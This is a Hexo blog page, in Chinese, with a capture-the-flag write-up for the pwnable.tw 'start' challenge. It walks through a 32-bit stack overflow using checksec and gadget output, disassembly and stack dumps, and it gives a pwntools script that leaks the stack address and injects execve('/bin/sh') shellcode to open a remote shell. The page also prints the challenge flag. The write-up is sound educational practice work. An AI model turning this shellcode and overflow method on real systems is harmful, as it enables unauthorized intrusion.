@@ -1,0 +1,347 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="Hexo">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://yoursite.com">
+    <!--SEO-->
+
+<meta name="keywords" content="" />
+
+
+<meta name="description" content="刚拿到题有点懵,纯汇编代码,两个操作,一个是调用write()输出一段字符串,第二个是调用read()读取0x3c个字符,查看保护,发现是32位程序,保护全关
+12345Arch:     i3..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    Pwnable.tw/[pwnable.tw] start — 100pt |
+    
+    Hexo
+</title>
+
+<link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash">
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+</head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    http://snippet.shenliyang.com/img/banner.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='John Doe'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <img src="/img/branding.png" alt="Snippet 博客主题" class="img-responsive center-block">
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://yoursite.com">
+                        Hexo</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/前端/"><i class="fa "></i>
+                                前端</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/后端/"><i class="fa "></i>
+                                后端</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/工具/"><i class="fa "></i>
+                                工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Pwnable.tw/[pwnable.tw] start — 100pt">
+            
+            Pwnable.tw/[pwnable.tw] start — 100pt
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2019/11/26</span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>刚拿到题有点懵,纯汇编代码,两个操作,一个是调用<code>write()</code>输出一段字符串,第二个是调用<code>read()</code>读取0x3c个字符,查看保护,发现是32位程序,保护全关</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>对于堆栈的操作一开始有push 20字节进栈里,后面从stdin读取60个字节,存在栈溢出可以控制程序流程,考虑构造ROP,但是并没有发现”pop|ret”</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  pwnable.tw ROPgadget --binary start</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804809b : adc al, 0xc3 ; pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x0804808e : add al, 0xcd ; xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x08048099 : add esp, 0x14 ; ret</span><br><span class="line">0x08048086 : daa ; mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x080480a0 : inc eax ; int 0x80</span><br><span class="line">0x0804808f : int 0x80</span><br><span class="line">0x0804809a : les edx, ptr [ebx + eax*8] ; pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x08048095 : mov al, 3 ; int 0x80</span><br><span class="line">0x0804808d : mov al, 4 ; int 0x80</span><br><span class="line">0x0804808b : mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x08048089 : mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x08048093 : mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</span><br><span class="line">0x0804809d : pop esp ; xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x0804809c : ret</span><br><span class="line">0x08048090 : xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line">0x0804809e : xor eax, eax ; inc eax ; int 0x80</span><br><span class="line">0x08048091 : xor ebx, ebx ; mov dl, 0x3c ; mov al, 3 ; int 0x80</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 18</span><br></pre></td></tr></table></figure>
+
+<p>考虑使用int80中断执行execve(“/bin/sh”),但是不存在可以操作的寄存器的rop</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Name</th>
+<th>Registers</th>
+<th>Definition</th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>eax</td>
+<td>ebx</td>
+<td>ecx</td>
+<td>edx</td>
+<td>esi</td>
+<td>edi</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>11</td>
+<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener">sys_execve</a></td>
+<td>0x0b</td>
+<td>char __user *</td>
+<td>char <strong>user *</strong>user *</td>
+<td>char <strong>user *</strong>user *</td>
+<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td>
+<td>-</td>
+<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:925</a></td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 public _start</span><br><span class="line">.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br><span class="line">.text:0804809C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+
+<p>再次查看汇编代码,发现<code>.text:08048087                 mov     ecx, esp        ; addr</code>这里将esp的值写入ec x,这条汇编代码出现的很突兀,ecx是write指向输出的地址,这里利用栈溢出可以再将程序流程回到0x8048087输出栈地址,然后将执行execve(“/bin/sh”)的指令写入栈中ret时执行.</p>
+<p>第二次回到<code>0x8048087</code>执行完<code>mov     ecx, esp</code>时,栈内布局如下,可以读取到<code>$esp(0xfffec6ec)</code>的值<code>(0xfffec6f0)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ ecx esp  0xfffec6ec —▸ 0xfffec6f0 ◂— 0x1</span><br><span class="line">01:0004│          0xfffec6f0 ◂— 0x1</span><br><span class="line">02:0008│          0xfffec6f4 —▸ 0xfffee7ac ◂— &apos;./start&apos;</span><br><span class="line">03:000c│          0xfffec6f8 ◂— 0x0</span><br></pre></td></tr></table></figure>
+
+
+
+<p>返回地址为<code>0xfffec6ec+0x14 = 0x0xfffec700</code>,这里就可以计算返回地址和写入shellcode的位置,需要注意的是这里读入的60bytes,我在这里写入的返回地址为<code>0xfffec70c</code>,需要覆盖掉前面的长度为<code>0xfffec70c -0xfffec6ec = 0x20</code>,需要填充8个<code>p32(esp)</code>,将shellcode从<code>0xfffec70c</code>开始布局<code>(这里可以自己试下其他的写入位置和偏移)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   0x804808f  &lt;_start+47&gt;    int    0x80</span><br><span class="line">   0x8048091  &lt;_start+49&gt;    xor    ebx, ebx</span><br><span class="line">   0x8048093  &lt;_start+51&gt;    mov    dl, 0x3c</span><br><span class="line">   0x8048095  &lt;_start+53&gt;    mov    al, 3</span><br><span class="line">   0x8048097  &lt;_start+55&gt;    int    0x80</span><br><span class="line"> ► 0x8048099  &lt;_start+57&gt;    add    esp, 0x14</span><br><span class="line">   0x804809c  &lt;_start+60&gt;    ret</span><br><span class="line">    ↓</span><br><span class="line">   0xfffec70c                xor    eax, eax</span><br><span class="line">   0xfffec70e                push   eax</span><br><span class="line">   0xfffec70f                push   0x68732f2f</span><br><span class="line">   0xfffec714                push   0x6e69622f</span><br><span class="line">──────[ STACK ]──────</span><br><span class="line">00:0000│ ecx esp  0xfffec6ec —▸ 0xfffec70c ◂— 0x6850c031</span><br></pre></td></tr></table></figure>
+
+<p>获取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>利用脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding='utf-8'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">payload = <span class="string">'\x90'</span>*<span class="number">20</span></span><br><span class="line">payload += p32(<span class="number">0x08048087</span>)</span><br><span class="line">shellcode = unhex(<span class="string">'31c050682f2f7368682f62696e89e3505389e199b00b31d2cd80'</span>)</span><br><span class="line">sh = process(<span class="string">"./start"</span>)</span><br><span class="line">sh = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line"><span class="comment">#raw_input("1:")</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">esp = u32(sh.recv()[:<span class="number">4</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">esp = esp  + <span class="number">0x1c</span></span><br><span class="line"><span class="keyword">print</span> hex(esp)</span><br><span class="line">payload = p32(esp)*<span class="number">8</span> +  shellcode</span><br><span class="line"><span class="keyword">assert</span> len(payload) &lt;= <span class="number">60</span>,<span class="string">"more than 60 bytes,error"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考链接</p>
+<p><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a></p>
+<p><a href="https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6" target="_blank" rel="noopener">https://medium.com/@__cpg/pwnable-tw-start-100pt-b98f55bf8d6</a></p>
+
+    </div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="" target="_blank">Snippet</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    
+</div>
+
+<div id="comments">
+    
+
+<div id="vcomments" class="valine"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="/assets/valine.min.js"></script>
+<script>
+new Valine({
+    av: AV,
+    el: '#vcomments',
+    appId: 'xOKV9J4UeQAtVkvnJC7Kq2Jn-gzGzoHsz',
+    appKey: 'erIpQac4azoCmgfBB7Dl9maa',
+    placeholder: '说点什么吧',
+    notify: false,
+    verify: true,
+    avatar: 'mm',
+    meta: 'nick,mail'.split(','),
+    pageSize: '10',
+    path: window.location.pathname,
+    lang: 'en'.toLowerCase()
+})
+</script>
+
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <p>暂无目录</p>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2017
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/js/app.js?rev=@@hash"></script>
+</body>
+</html>
